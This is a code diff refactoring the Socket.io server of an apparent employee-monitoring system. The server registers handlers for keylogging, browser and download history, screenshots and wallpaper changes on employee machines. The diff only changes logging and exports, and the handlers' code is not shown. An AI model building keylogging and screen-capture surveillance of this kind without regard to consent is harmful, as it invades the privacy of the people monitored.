@@ -8,11 +8,9 @@ const handleKeyLogger = require("./sockets/keyLogger");
 const handleWallpaper = require("./sockets/wallpaper");
 const handleBrowserHistory = require("./sockets/internetHistory");
 const handleScreenshot = require("./sockets/screenshots");
-const restart = require("./sockets/restart");
 
 const employeeSockets = {};
 const empLiveStatus = [];
-let socket;
 
 // Set up logging with Winston
 const logger = winston.createLogger({
@@ -34,19 +32,19 @@ function socketServer(server) {
 
   // Handle connections
   io.on("connection", (socket) => {
-    socket = socket;
-    logger.info("New client connected via Socket.io");
+    logger.info(`New client connected: ${socket.id}`);
 
     // Register employee sockets
     socket.on("register", (employeeId) => {
       employeeSockets[employeeId] = socket;
-      // socket.employeeId = employeeId;
-      // logger.info(`Employee ${employeeId} registered`);
-      logger.info(`Employee ${employeeId} registered and connected`);
+      logger.info(
+        `Employee ${employeeId} registered with socket ID ${socket.id}`
+      );
+      logConnectedClients();
     });
 
-    // Call your specific handlers
-    [
+    // Register handlers
+    const handlers = [
       handleDownloadHistory,
       handleBrowserHistory,
       handleEmployeeStatus,
@@ -54,21 +52,32 @@ function socketServer(server) {
       handleKeyLogger,
       handleWallpaper,
       handleScreenshot,
-    ].forEach((handler) =>
+    ];
+
+    handlers.forEach((handler) =>
       handler(socket, io, employeeSockets, logger, empLiveStatus)
     );
 
     // Handle disconnect
     socket.on("disconnect", () => {
-      logger.info("Client disconnected");
+      logger.info(`Client disconnected: ${socket.id}`);
       Object.entries(employeeSockets).forEach(([employeeId, sock]) => {
         if (sock === socket) {
           delete employeeSockets[employeeId];
           logger.info(`Employee ${employeeId} deregistered`);
+          logConnectedClients();
         }
       });
     });
   });
 }
 
-module.exports = { socketServer, employeeSockets, socket };
+// Function to log currently connected clients
+function logConnectedClients() {
+  const connectedEmployees = Object.keys(employeeSockets);
+  logger.info(
+    `Currently connected employees: ${connectedEmployees.join(", ")}`
+  );
+}
+
+module.exports = { socketServer, employeeSockets };
